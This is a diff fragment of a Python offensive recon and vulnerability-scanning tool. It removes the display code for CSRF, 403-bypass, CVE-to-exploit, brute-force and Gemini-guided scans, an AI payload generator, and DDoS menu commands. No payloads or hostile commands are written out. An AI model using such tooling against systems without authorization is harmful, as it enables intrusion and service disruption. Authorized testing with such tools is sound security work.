-            console.print(f"  All Mechanism: {spf['all_mechanism']}")
-
-        # Display DKIM
-        dkim = result.get('dkim', {})
-        dkim_found = dkim.get('selectors_found', [])
-        console.print(f"[bold]DKIM:[/bold] {len(dkim_found)} selectors found ({dkim.get('tested', 0)} tested)")
-
-        # Risk score
-        risk = result.get('risk_score', 0)
-        risk_color = 'red' if risk >= 70 else 'yellow' if risk >= 40 else 'green'
-        console.print(f"\n[bold]Email Spoofing Risk Score: [{risk_color}]{risk}/100[/{risk_color}][/bold]")
-        console.print(f"[bold]Risk Level: [{risk_color}]{result.get('risk_level', 'Unknown')}[/{risk_color}][/bold]")
-
-    def _scan_csrf(self):
-        """Scan 78: CSRF Token Detection & Login CSRF Tester"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] CSRF Detection on {self.target}[/bold cyan]")
-        with console.status("[bold cyan]Testing for CSRF vulnerabilities...[/bold cyan]"):
-            result = self.v4_hunting.scan_csrf(url)
-        self.results['findings']['csrf'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] CSRF Vulnerability Detected![/bold red]")
-            for f in result.get('findings', []):
-                sev = f.get('severity', 'Medium')
-                color = 'red' if sev in ['Critical', 'High'] else 'yellow'
-                console.print(f"  [{color}]*[/{color}] {f['type']} - Severity: {sev}")
-                if f.get('note'):
-                    console.print(f"      {f['note']}")
-            if result.get('poc_html'):
-                console.print("\n[bold yellow][!] CSRF PoC HTML generated - saved in report[/bold yellow]")
-        else:
-            console.print(f"[green][+] No CSRF vulnerabilities detected ({result.get('tested', 0)} forms tested)[/green]")
-
-    def _scan_framework(self):
-        """Scan 79: Framework Detection + Specific Attacks"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] Framework Detection on {self.target}[/bold cyan]")
-        with console.status("[bold cyan]Detecting frameworks and testing framework-specific attacks...[/bold cyan]"):
-            result = self.v4_hunting.scan_framework(url)
-        self.results['findings']['framework'] = result
-
-        # Display detected frameworks
-        framework_names = result.get('detected_frameworks', result.get('frameworks_detected', []))
-        framework_details = result.get('framework_details', {})
-        if framework_names:
-            fw_table = Table(title="Detected Frameworks", box=box.ROUNDED, border_style="cyan")
-            fw_table.add_column("Framework", style="cyan")
-            fw_table.add_column("Version", style="yellow")
-            fw_table.add_column("Evidence", style="green")
-            for fw_name in framework_names:
-                detail = framework_details.get(fw_name, {})
-                fw_table.add_row(
-                    fw_name,
-                    detail.get('version', 'Unknown'),
-                    ', '.join(detail.get('detection_methods', ['detected']))[:60]
-                )
-            console.print(fw_table)
-        else:
-            console.print("[yellow][!] No frameworks detected on main page (try scan on login portals)[/yellow]")
-
-        # Display framework-specific findings
-        findings = result.get('findings', [])
-        if findings:
-            console.print("\n[bold red]Framework-Specific Findings:[/bold red]")
-            for f in findings:
-                sev = f.get('severity', 'Medium')
-                color = 'red' if sev in ['Critical', 'High'] else 'yellow'
-                console.print(f"  [{color}]*[/{color}] {f['type']} - {f.get('note', '')[:80]}")
-
-    def _scan_js_libraries(self):
-        """Scan 80: Client-Side JS Library Vulnerability Scanner"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] Client-Side JS Library Vulnerability Scan on {self.target}[/bold cyan]")
-        with console.status("[bold cyan]Scanning JavaScript libraries for known vulnerabilities...[/bold cyan]"):
-            result = self.v4_hunting.scan_js_libraries(url)
-        self.results['findings']['js_libraries'] = result
-
-        # Display detected libraries
-        libs = result.get('libraries_found', result.get('libraries_detected', []))
-        if libs:
-            lib_table = Table(title="Detected JS Libraries", box=box.ROUNDED, border_style="cyan")
-            lib_table.add_column("Library", style="cyan")
-            lib_table.add_column("Version", style="yellow")
-            lib_table.add_column("Status", style="green")
-            for lib in libs:
-                status = "[red]Vulnerable[/red]" if lib.get('vulnerable') else "[green]OK[/green]"
-                lib_table.add_row(lib.get('name', ''), lib.get('version', '?'), status)
-            console.print(lib_table)
-
-        # Display vulnerabilities
-        if result.get('vulnerable'):
-            console.print("\n[bold red]Vulnerable JS Libraries Found![/bold red]")
-            for f in result.get('findings', []):
-                sev = f.get('severity', 'Medium')
-                color = 'red' if sev in ['Critical', 'High'] else 'yellow'
-                console.print(f"  [{color}]*[/{color}] {f['type']} - Severity: {sev}")
-                console.print(f"      {f.get('note', '')[:80]}")
-        else:
-            console.print(f"[green][+] No vulnerable JS libraries detected ({result.get('tested', 0)} checked)[/green]")
-
-    def _scan_403_bypass(self):
-        """Scan 81: 403 Bypass Tester"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] 403 Bypass Test on {self.target}[/bold cyan]")
-        with console.status("[bold cyan]Testing 403 bypass techniques...[/bold cyan]"):
-            result = self.v4_hunting.scan_403_bypass(url)
-        self.results['findings']['403_bypass'] = result
-
-        if result.get('bypassed'):
-            console.print("[bold red][!] 403 Bypass Found![/bold red]")
-            b_table = Table(title="Successful 403 Bypasses", box=box.HEAVY, border_style="red")
-            b_table.add_column("Technique", style="red")
-            b_table.add_column("Status", style="yellow")
-            b_table.add_column("Size", style="cyan")
-            for f in result.get('findings', []):
-                b_table.add_row(
-                    f.get('technique', ''),
-                    str(f.get('status', '')),
-                    str(f.get('size', ''))
-                )
-            console.print(b_table)
-        else:
-            console.print(f"[green][+] No 403 bypass found ({result.get('tested', 0)} techniques tested)[/green]")
-
-    def _scan_cross_domain(self):
-        """Scan 82: Cross-Domain Discovery"""
-        console.print(f"\n[bold cyan][*] Cross-Domain Discovery on {self.target}[/bold cyan]")
-        with console.status("[bold cyan]Finding sibling domains on same IP...[/bold cyan]"):
-            result = self.v4_hunting.scan_cross_domain(self.target)
-        self.results['findings']['cross_domain'] = result
-
-        domains = result.get('domains', [])
-        if domains:
-            cd_table = Table(title=f"Domains on Same IP ({result.get('ip', '')})", box=box.ROUNDED, border_style="yellow")
-            cd_table.add_column("Domain", style="cyan")
-            cd_table.add_column("Title", style="yellow")
-            cd_table.add_column("Server", style="green")
-            for d in domains:
-                cd_table.add_row(
-                    d.get('domain', ''),
-                    d.get('title', '')[:40],
-                    d.get('server', '')[:30]
-                )
-            console.print(cd_table)
-        else:
-            console.print(f"[yellow][!] No sibling domains found ({result.get('tested', 0)} checked)[/yellow]")
-
-        if result.get('findings'):
-            console.print("\n[bold red]Cross-Domain Findings:[/bold red]")
-            for f in result['findings']:
-                console.print(f"  [red]*[/red] {f.get('type', '')} - {f.get('note', '')[:80]}")
-
-    def _scan_cve_lookup(self):
-        """Scan 83: CVE-to-Exploit Lookup Engine"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] CVE-to-Exploit Lookup on {self.target}[/bold cyan]")
-        with console.status("[bold cyan]Looking up CVEs and exploits...[/bold cyan]"):
-            result = self.v4_hunting.scan_cve_lookup(url)
-        self.results['findings']['cve_lookup'] = result
-
-        cve_groups = result.get('cve_groups', {})
-        techs = result.get('technologies', [])
-
-        if techs:
-            console.print(f"\n[bold]Detected Technologies for CVE Lookup:[/bold]")
-            for t in techs:
-                console.print(f"  [cyan]*[/cyan] {t.get('name', '')} {t.get('version', '')}")
-
-        total_cves = result.get('total_cves', 0)
-        if total_cves > 0:
-            console.print(f"\n[bold red]Total CVEs Found: {total_cves}[/bold red]")
-
-            for severity in ['Critical', 'High', 'Medium', 'Low']:
-                cves = cve_groups.get(severity, [])
-                if cves:
-                    color = 'red' if severity in ['Critical', 'High'] else 'yellow'
-                    console.print(f"\n[bold {color}]{severity} ({len(cves)} CVEs):[/{color}]")
-                    for cve in cves[:10]:
-                        cve_id = cve.get('id', '')
-                        cvss = cve.get('cvss', 'N/A')
-                        desc = cve.get('description', '')[:80]
-                        exploitable = '[red]EXPLOIT[/red]' if cve.get('exploitable') else ''
-                        console.print(f"  [{color}]*[/{color}] {cve_id} (CVSS: {cvss}) {exploitable}")
-                        console.print(f"      {desc}")
-        else:
-            console.print("[green][+] No critical CVEs found for detected technologies[/green]")
-
-    # ====================================================================
-    # V5.0 ASYNC ENGINE SCAN IMPLEMENTATIONS
-    # ====================================================================
-
-    def _scan_subdomain_brute(self):
-        """Scan 84: Subdomain Brute Force (Active DNS + Wordlist)"""
-        console.print(f"\n[bold cyan][*] Subdomain Brute Force on {self.target}[/bold cyan]")
-
-        # Show wordlist stats
-        wl_stats = self.v5_async.get_wordlist_stats()
-        subdomain_count = wl_stats.get('subdomains', 0)
-        console.print(f"[cyan]    Wordlist: {subdomain_count} subdomain names loaded[/cyan]")
-
-        with console.status(f"[bold cyan]Resolving {subdomain_count} subdomains via DNS...[/bold cyan]"):
-            result = self.v5_async.scan_subdomain_bruteforce(self.target)
-
-        self.results['findings']['subdomain_brute'] = result
-
-        found = result.get('found', [])
-        if found:
-            s_table = Table(
-                title=f"[bold green]Subdomains Found: {len(found)}[/bold green] ({result.get('time_taken', 0)}s)",
-                box=box.ROUNDED, border_style="green"
-            )
-            s_table.add_column("#", style="dim")
-            s_table.add_column("Subdomain", style="cyan")
-            s_table.add_column("IP", style="yellow")
-            s_table.add_column("Reverse DNS", style="green")
-            for i, sub in enumerate(found, 1):
-                s_table.add_row(str(i), sub['subdomain'], sub['ip'],
-                               sub.get('reverse_dns', '')[:40])
-            console.print(s_table)
-            console.print(f"\n[cyan]Tested: {result['tested']} | Resolved: {result['resolved']} | "
-                         f"Time: {result['time_taken']}s[/cyan]")
-        else:
-            console.print(f"[yellow][!] No subdomains resolved from {subdomain_count} names[/yellow]")
-            console.print(f"[cyan]    Tested: {result['tested']} | Time: {result['time_taken']}s[/cyan]")
-
-    def _scan_dir_brute_async(self):
-        """Scan 85: Directory Brute Force (Async High-Speed)"""
-        console.print(f"\n[bold cyan][*] Async Directory Brute Force on {self.target}[/bold cyan]")
-        url = f"{self.protocol}{self.target}"
-
-        # Show wordlist stats
-        wl_stats = self.v5_async.get_wordlist_stats()
-        dir_count = wl_stats.get('directories', 0)
-        console.print(f"[cyan]    Wordlist: {dir_count} paths loaded | Async mode[/cyan]")
-
-        with console.status(f"[bold cyan]Scanning {dir_count} paths at high speed...[/bold cyan]"):
-            result = self.v5_async.scan_dir_bruteforce_async(url)
-
-        self.results['findings']['dir_brute_async'] = result
-
-        found = result.get('found', [])
-        if found:
-            d_table = Table(
-                title=f"[bold]Paths Found: {len(found)}[/bold] ({result.get('time_taken', 0)}s)",
-                box=box.ROUNDED, border_style="cyan"
-            )
-            d_table.add_column("#", style="dim")
-            d_table.add_column("Path", style="yellow")
-            d_table.add_column("Status", style="green")
-            d_table.add_column("Size", style="cyan")
-            for i, item in enumerate(found[:150], 1):
-                status = item.get('status', 0)
-                status_color = "green" if status == 200 else "yellow" if status in [301, 302] else "red"
-                size = str(item.get('size', ''))
-                d_table.add_row(str(i), item.get('path', ''),
-                               f"[{status_color}]{status}[/{status_color}]", size)
-            console.print(d_table)
-            if len(found) > 150:
-                console.print(f"[yellow]... and {len(found) - 150} more paths[/yellow]")
-            console.print(f"\n[cyan]Scanned: {result['tested']} | Found: {len(found)} | "
-                         f"Time: {result['time_taken']}s[/cyan]")
-        else:
-            console.print(f"[yellow][!] No accessible paths found[/yellow]")
-            console.print(f"[cyan]    Scanned: {result['tested']} | Time: {result['time_taken']}s[/cyan]")
-
-    def _scan_smart(self):
-        """Scan 86: AI Smart Scan (Gemini-Guided Auto Recon)"""
-        console.print(f"\n[bold magenta][*] AI Smart Scan on {self.target}[/bold magenta]")
-
-        gemini_configured = bool(self.ai.gemini_api_key)
-        if gemini_configured:
-            console.print("[magenta]    Gemini AI: Connected[/magenta]")
-        else:
-            console.print("[yellow]    Gemini AI: Not configured (use 'config' to set key)[/yellow]")
-            console.print("[yellow]    Running basic smart scan without AI...[/yellow]")
-
-        with console.status("[bold magenta]Running AI-guided smart scan...[/bold magenta]"):
-            result = self.v5_async.scan_smart(
-                self.target,
-                ai_bridge=self.ai if gemini_configured else None
-            )
-
-        self.results['findings']['smart_scan'] = result
-
-        # Display Phase 1: Quick Recon results
-        phases = result.get('phases', [])
-        for phase in phases:
-            findings = phase.get('findings', {})
-            if findings:
-                p_table = Table(
-                    title=f"[bold]{phase['name']} Results[/bold]",
-                    box=box.ROUNDED, border_style="cyan"
-                )
-                p_table.add_column("Property", style="yellow")
-                p_table.add_column("Value", style="green")
-                for key, val in findings.items():
-                    if isinstance(val, (str, int, float, bool)):
-                        p_table.add_row(key, str(val))
-                    elif isinstance(val, list) and len(val) < 10:
-                        p_table.add_row(key, ', '.join(str(v) for v in val))
-                    elif isinstance(val, dict):
-                        p_table.add_row(key, f"{len(val)} items")
-                console.print(p_table)
-
-        # Display AI Recommendations
-        ai_recs = result.get('ai_recommendations')
-        if ai_recs:
-            console.print(Panel(
-                ai_recs,
-                title="[bold magenta]AI Recommendations[/bold magenta]",
-                border_style="magenta"
-            ))
-
-        # Display recommended next scans
-        recs = result.get('summary', {}).get('recommended_next_scans', [])
-        if recs:
-            r_table = Table(
-                title="[bold yellow]Recommended Next Scans[/bold yellow]",
-                box=box.ROUNDED, border_style="yellow"
-            )
-            r_table.add_column("Scan ID", style="cyan")
-            r_table.add_column("Name", style="green")
-            r_table.add_column("Reason", style="yellow")
-            for rec in recs:
-                r_table.add_row(rec['scan_id'], rec['name'], rec['reason'][:60])
-            console.print(r_table)
-
-    # ========================================================================
-    # SCAN 87: AI VULNERABILITY TRIAGE
-    # ========================================================================
-
-    def _scan_ai_triage(self):
-        """Scan 87: AI Vulnerability Triage - Classify & Prioritize findings"""
-        console.print(f"\n[bold magenta][*] AI Vulnerability Triage on {self.target}[/bold magenta]")
-
-        if not self.ai.gemini_api_key:
-            console.print("[bold yellow][!] Gemini API key not configured. Use 'config' command.[/bold yellow]")
-            return
-
-        if not self.results or not self.results.get('findings'):
-            console.print("[bold yellow][!] Run some scans first to generate findings for triage[/bold yellow]")
-            console.print("[cyan]    Tip: Run scans 0, 7, 9, 10, 11 first, then use scan 87[/cyan]")
-            return
-
-        findings_list = []
-        for category, data in self.results.get('findings', {}).items():
-            findings_list.append({'category': category, 'data': str(data)[:500]})
-
-        with console.status("[bold magenta]Gemini AI is triaging vulnerabilities...[/bold magenta]"):
-            triage_result = self.ai.ai_triage(self.target, findings_list)
-
-        if triage_result:
-            self.results['findings']['ai_triage'] = triage_result
-            console.print(Panel(
-                triage_result,
-                title="[bold magenta]AI Triage Results[/bold magenta]",
-                border_style="magenta"
-            ))
-        else:
-            console.print("[bold yellow][!] AI triage unavailable - check API key[/bold yellow]")
-
-    # ========================================================================
-    # SCAN 88: AI RECON ADVISOR
-    # ========================================================================
-
-    def _scan_ai_recon_advisor(self):
-        """Scan 88: AI Recon Advisor - Strategy suggestions based on recon data"""
-        console.print(f"\n[bold magenta][*] AI Recon Advisor for {self.target}[/bold magenta]")
-
-        if not self.ai.gemini_api_key:
-            console.print("[bold yellow][!] Gemini API key not configured. Use 'config' command.[/bold yellow]")
-            return
-
-        # Run quick recon first
-        recon_data = {}
-        with console.status("[bold cyan]Gathering recon data for AI analysis...[/bold cyan]"):
-            try:
-                import socket
-                ip = socket.gethostbyname(self.target)
-                recon_data['ip'] = ip
-            except Exception:
-                pass
-
-            try:
-                resp = self.session.get(f"https://{self.target}", timeout=10, verify=False)
-                recon_data['status'] = resp.status_code
-                recon_data['server'] = resp.headers.get('Server', 'Unknown')
-                recon_data['headers'] = dict(list(resp.headers.items())[:20])
-                
-                from bs4 import BeautifulSoup
-                soup = BeautifulSoup(resp.text, 'html.parser')
-                title = soup.find('title')
-                if title:
-                    recon_data['title'] = title.string or ''
-                js_files = [s.get('src', '') for s in soup.find_all('script', src=True)]
-                recon_data['js_count'] = len(js_files)
-            except Exception as e:
-                recon_data['http_error'] = str(e)[:100]
-
-            # Quick DNS
-            try:
-                import dns.resolver
-                resolver = dns.resolver.Resolver()
-                resolver.timeout = 3
-                a_records = resolver.resolve(self.target, 'A')
-                recon_data['dns_a'] = [str(r) for r in a_records]
-            except Exception:
-                pass
-
-        # Get AI advice
-        with console.status("[bold magenta]Gemini AI is analyzing recon strategy...[/bold magenta]"):
-            advisor_result = self.ai.ai_recon_advisor(self.target, recon_data)
-
-        if advisor_result:
-            self.results['findings']['ai_recon_advisor'] = advisor_result
-            console.print(Panel(
-                advisor_result,
-                title="[bold magenta]AI Recon Strategy[/bold magenta]",
-                border_style="magenta"
-            ))
-        else:
-            console.print("[bold yellow][!] AI advisor unavailable - check API key[/bold yellow]")
-
-    # ========================================================================
-    # AI COMMAND HANDLERS
-    # ========================================================================
-
-    def _ai_payload_gen(self):
-        """AI-powered payload generation"""
-        if not self.ai.gemini_api_key:
-            console.print("[bold yellow][!] Gemini API key not configured. Use 'config' command.[/bold yellow]")
-            return
-
-        vuln_type = Prompt.ask("[bold cyan]Vulnerability type (sqli/xss/ssrf/ssti/lfi/rce/etc)[/bold cyan]")
-        context = Prompt.ask("[bold cyan]Context (URL, tech stack, etc.)[/bold cyan]", default=self.target or "")
-
-        console.print(f"\n[bold magenta][*] Generating {vuln_type} payloads...[/bold magenta]")
-        with console.status("[bold magenta]Gemini AI is crafting payloads...[/bold magenta]"):
-            result = self.ai.ai_generate_payload(vuln_type, context)
-
-        if result:
-            console.print(Panel(
-                result,
-                title=f"[bold magenta]AI-Generated {vuln_type.upper()} Payloads[/bold magenta]",
-                border_style="magenta"
-            ))
-        else:
-            console.print("[bold yellow][!] Payload generation unavailable[/bold yellow]")
-
-    def _ai_triage_cmd(self):
-        """AI triage command handler"""
-        self._scan_ai_triage()
-
-    def _ai_test(self):
-        """Test Gemini API connection"""
-        console.print("\n[bold cyan][*] Testing Gemini API connection...[/bold cyan]")
-        success, message = self.ai.test_connection()
-        if success:
-            console.print(f"[bold green][+] {message}[/bold green]")
-        else:
-            console.print(f"[bold red][!] Connection failed: {message}[/bold red]")
-
-    def _show_perf_stats(self):
-        """Display performance statistics"""
-        console.print("\n[bold cyan][*] Performance Statistics[/bold cyan]")
-
-        stats = get_performance_stats()
-
-        perf_table = Table(
-            title="Performance Engine Stats",
-            box=box.DOUBLE, border_style="cyan"
-        )
-        perf_table.add_column("Component", style="yellow")
-        perf_table.add_column("Metric", style="cyan")
-        perf_table.add_column("Value", style="green")
-
-        # DNS Cache
-        dns = stats.get('dns_cache', {})
-        perf_table.add_row("DNS Cache", "Entries", str(dns.get('entries', 0)))
-        perf_table.add_row("DNS Cache", "Hit Rate", str(dns.get('hit_rate', '0%')))
-        perf_table.add_row("DNS Cache", "Hits", str(dns.get('hits', 0)))
-        perf_table.add_row("DNS Cache", "Misses", str(dns.get('misses', 0)))
-
-        # Session
-        perf_table.add_row("HTTP Session", "Total Requests", str(stats.get('session_requests', 0)))
-
-        # Threading
-        threading_stats = stats.get('threading', {})
-        perf_table.add_row("Threading", "Current Threads", str(threading_stats.get('current_threads', 0)))
-        perf_table.add_row("Threading", "Success Count", str(threading_stats.get('success_count', 0)))
-        perf_table.add_row("Threading", "Error Count", str(threading_stats.get('error_count', 0)))
-        perf_table.add_row("Threading", "Avg Response", str(threading_stats.get('avg_response_time', 'N/A')))
-
-        # Timeout
-        timeout_stats = stats.get('timeout', {})
-        perf_table.add_row("Timeout", "Current", str(timeout_stats.get('current_timeout', '10s')))
-        perf_table.add_row("Timeout", "Samples", str(timeout_stats.get('samples', 0)))
-
-        console.print(perf_table)
-
-        # AI Status
-        ai_status = self.ai.get_status()
-        ai_table = Table(
-            title="AI Bridge Status",
-            box=box.ROUNDED, border_style="magenta"
-        )
-        ai_table.add_column("Property", style="yellow")
-        ai_table.add_column("Value", style="green")
-
-        ai_table.add_row("Provider", ai_status.get('provider', 'N/A'))
-        ai_table.add_row("Model", ai_status.get('model', 'N/A'))
-        ai_table.add_row("Fallback Model", ai_status.get('fallback_model', 'N/A'))
-        ai_table.add_row("API Key Set", "Yes" if ai_status.get('api_key_set') else "No")
-        ai_table.add_row("Total AI Requests", str(ai_status.get('total_requests', 0)))
-        ai_table.add_row("Last Error", str(ai_status.get('last_error', 'None')))
-
-        console.print(ai_table)
-
     def run_ai_analysis(self):
         """AI-powered vulnerability analysis"""
         if not self.results or not self.results.get('findings'):
             console.print("[bold yellow][!] Run a scan first before AI analysis[/bold yellow]")
             return
-
-        gemini_configured = bool(self.ai.gemini_api_key)
-        if not gemini_configured:
-            console.print("[bold yellow][!] Gemini API key not configured. Use 'config' command to set it.[/bold yellow]")
-            console.print("[cyan]    Set key: gemini_api_key = YOUR_KEY[/cyan]")
-
+        
         console.print("\n[bold magenta][*] AI-Powered Vulnerability Analysis[/bold magenta]")
-        with console.status("[bold magenta]Gemini AI is analyzing scan results...[/bold magenta]"):
+        with console.status("[bold magenta]AI is analyzing scan results...[/bold magenta]"):
             analysis = self.ai.analyze_results(self.results)
-
+        
         if analysis:
             console.print(Panel(
                 analysis.get('summary', 'No analysis available'),
-                title="[bold magenta]Gemini AI Analysis[/bold magenta]",
+                title="[bold magenta]AI Analysis[/bold magenta]",
                 border_style="magenta"
             ))
         else:
@@ -4254,64 +2525,7 @@ class ZylonFusion:
                     self._report_menu()
                 
                 elif user_input.lower() == 'ai':
-                    self._ai_chat_mode()
-                
-                elif user_input.lower() == 'aianalyze':
                     self.run_ai_analysis()
-                
-                elif user_input.lower() == 'aireport':
-                    self._ai_report()
-                
-                elif user_input.lower() == 'smart':
-                    if not self.target:
-                        target = Prompt.ask("[bold yellow]Enter target domain/IP[/bold yellow]")
-                        success, msg = self.set_target(target)
-                        if not success:
-                            console.print(f"[bold red][!] {msg}[/bold red]")
-                            continue
-                        console.print(f"[green][+] {msg}[/green]")
-                    self._scan_smart()
-                    self.reports.save_json(self.results, self.target)
-                
-                elif user_input.lower() == 'beast':
-                    if not self.target:
-                        target = Prompt.ask("[bold yellow]Enter target domain/IP[/bold yellow]")
-                        success, msg = self.set_target(target)
-                        if not success:
-                            console.print(f"[bold red][!] {msg}[/bold red]")
-                            continue
-                        console.print(f"[green][+] {msg}[/green]")
-                    self._scan_beast()
-                    self.reports.save_json(self.results, self.target)
-                
-                elif user_input.lower() == 'ddos':
-                    if not self.target:
-                        target = Prompt.ask("[bold yellow]Enter target domain/IP[/bold yellow]")
-                        success, msg = self.set_target(target)
-                        if not success:
-                            console.print(f"[bold red][!] {msg}[/bold red]")
-                            continue
-                        console.print(f"[green][+] {msg}[/green]")
-                    self._scan_ddos_suite()
-                    self.reports.save_json(self.results, self.target)
-                
-                elif user_input.lower() == 'battle':
-                    self._battle_mode_menu()
-                
-                elif user_input.lower() == 'wordlists':
-                    self._show_wordlist_stats()
-                
-                elif user_input.lower() == 'aipayload':
-                    self._ai_payload_gen()
-                
-                elif user_input.lower() == 'aitriage':
-                    self._ai_triage_cmd()
-                
-                elif user_input.lower() == 'aitest':
-                    self._ai_test()
-                
-                elif user_input.lower() == 'perf':
-                    self._show_perf_stats()
                 
                 elif user_input.isdigit() and 0 <= int(user_input) <= 99:
                     if not self.target:
@@ -4330,7 +2544,7 @@ class ZylonFusion:
                         console.print(f"[green][+] {msg}[/green]")
                         # Ask for scan type
                         scan_type = Prompt.ask(
-                            "[bold yellow]Select scan type (0-86, 99)[/bold yellow]",
+                            "[bold yellow]Select scan type (0-49, 99)[/bold yellow]",
                             default="0"
                         )
                         if scan_type.isdigit() and 0 <= int(scan_type) <= 99:
@@ -4356,7 +2570,7 @@ class ZylonFusion:
             with open(config_file) as f:
                 config = json.load(f)
         
-        keys = ['gemini_api_key', 'shodan_api_key', 'virustotal_api_key', 'hunter_api_key', 
+        keys = ['shodan_api_key', 'virustotal_api_key', 'hunter_api_key', 
                 'securitytrails_api_key', 'censys_api_id', 'censys_api_secret',
                 'github_api_key', 'ai_api_key']
         
@@ -4371,14 +2585,9 @@ class ZylonFusion:
         
         action = Prompt.ask("[yellow]Set API key? (y/n)[/yellow]", default="n")
         if action.lower() == 'y':
-            key_name = Prompt.ask("[yellow]API key name (e.g. gemini_api_key)[/yellow]")
+            key_name = Prompt.ask("[yellow]API key name[/yellow]")
             key_val = Prompt.ask("[yellow]API key value[/yellow]")
             config[key_name] = key_val
-            
-            # Auto-configure Gemini
-            if key_name == 'gemini_api_key':
-                self.ai.set_gemini_key(key_val)
-                console.print("[green][+] Gemini API key configured and saved![/green]")
             
             os.makedirs(os.path.dirname(config_file), exist_ok=True)
             with open(config_file, 'w') as f:
@@ -4401,113 +2610,6 @@ class ZylonFusion:
                 console.print("[yellow][!] No reports found[/yellow]")
         else:
             console.print("[yellow][!] No reports directory found[/yellow]")
-
-    def _ai_chat_mode(self):
-        """Interactive AI chat mode using Gemini"""
-        gemini_configured = bool(self.ai.gemini_api_key)
-        if not gemini_configured:
-            console.print("[bold yellow][!] Gemini API key not configured![/bold yellow]")
-            console.print("[cyan]    Use 'config' command and set gemini_api_key[/cyan]")
-            return
-
-        console.print("\n[bold magenta]=== ZYLON AI Chat (Gemini) ===[/bold magenta]")
-        console.print("[cyan]Type your security question. 'exit' to leave chat mode.[/cyan]")
-
-        # Build context from current target
-        context = ""
-        if self.target:
-            context = f"Current target: {self.target}"
-            if self.results and self.results.get('findings'):
-                context += f"\nScan results available: {list(self.results['findings'].keys())}"
-
-        while True:
-            try:
-                console.print("[bold magenta]AI>[/bold magenta] ", end="")
-                question = input().strip()
-                if not question:
-                    continue
-                if question.lower() in ['exit', 'quit', 'q', 'back']:
-                    break
-
-                with console.status("[bold magenta]Gemini AI is thinking...[/bold magenta]"):
-                    response = self.ai.ai_chat(question, context=context)
-
-                console.print(Panel(response, title="[bold magenta]ZYLON AI[/bold magenta]",
-                                   border_style="magenta"))
-
-                # Update context with conversation
-                context += f"\n\nQ: {question}\nA: {response[:200]}"
-
-            except KeyboardInterrupt:
-                break
-            except EOFError:
-                break
-
-    def _ai_report(self):
-        """Generate AI-powered bug bounty report"""
-        if not self.results or not self.results.get('findings'):
-            console.print("[bold yellow][!] Run a scan first before generating report[/bold yellow]")
-            return
-
-        gemini_configured = bool(self.ai.gemini_api_key)
-        if not gemini_configured:
-            console.print("[bold yellow][!] Gemini API key not configured. Use 'config' command.[/bold yellow]")
-            return
-
-        console.print("\n[bold magenta][*] AI-Powered Bug Bounty Report Generation[/bold magenta]")
-        with console.status("[bold magenta]Gemini AI is writing your report...[/bold magenta]"):
-            report = self.ai.ai_write_report(self.target, self.results.get('findings', {}))
-
-        if report:
-            console.print(Panel(report, title="[bold magenta]Bug Bounty Report[/bold magenta]",
-                              border_style="magenta"))
-
-            # Save report to file
-            report_dir = os.path.join(get_home(), '.zylon', 'reports')
-            os.makedirs(report_dir, exist_ok=True)
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            report_file = os.path.join(report_dir, f"ai_report_{self.target}_{timestamp}.md")
-            with open(report_file, 'w') as f:
-                f.write(f"# Bug Bounty Report - {self.target}\n\n")
-                f.write(f"Generated: {datetime.now().isoformat()}\n\n")
-                f.write(report)
-            console.print(f"\n[green][+] Report saved to: {report_file}[/green]")
-        else:
-            console.print("[bold yellow][!] Report generation failed[/bold yellow]")
-
-    def _show_wordlist_stats(self):
-        """Show built-in wordlist statistics"""
-        console.print("\n[bold cyan][*] Built-in Wordlist Statistics[/bold cyan]")
-
-        stats = self.v5_async.get_wordlist_stats()
-
-        wl_table = Table(
-            title="[bold]ZYLON Wordlists[/bold]",
-            box=box.ROUNDED, border_style="cyan"
-        )
-        wl_table.add_column("Wordlist", style="yellow")
-        wl_table.add_column("Entries", style="green")
-        wl_table.add_column("Used By", style="cyan")
-
-        wl_usage = {
-            'directories': 'Scan 11, 85 (Dir Brute)',
-            'subdomains': 'Scan 84 (Subdomain Brute)',
-            'usernames': 'Scan 76 (Username Enum)',
-            'passwords': 'Login brute force',
-            'jwt_secrets': 'Scan 40 (JWT Scanner)',
-            'ssrf_payloads': 'Scan 30 (SSRF)',
-            'lfi_payloads': 'Scan 32 (LFI)',
-        }
-
-        for name, count in stats.items():
-            usage = wl_usage.get(name, 'Various')
-            count_str = str(count) if count > 0 else "[red]Not loaded[/red]"
-            wl_table.add_row(name, count_str, usage)
-
-        console.print(wl_table)
-        console.print(f"\n[cyan]Wordlist path: {WORDLISTS_DIR}[/cyan]")
-        total = sum(stats.values())
-        console.print(f"[green]Total entries across all wordlists: {total}[/green]")
 
 
 # ============================================================================
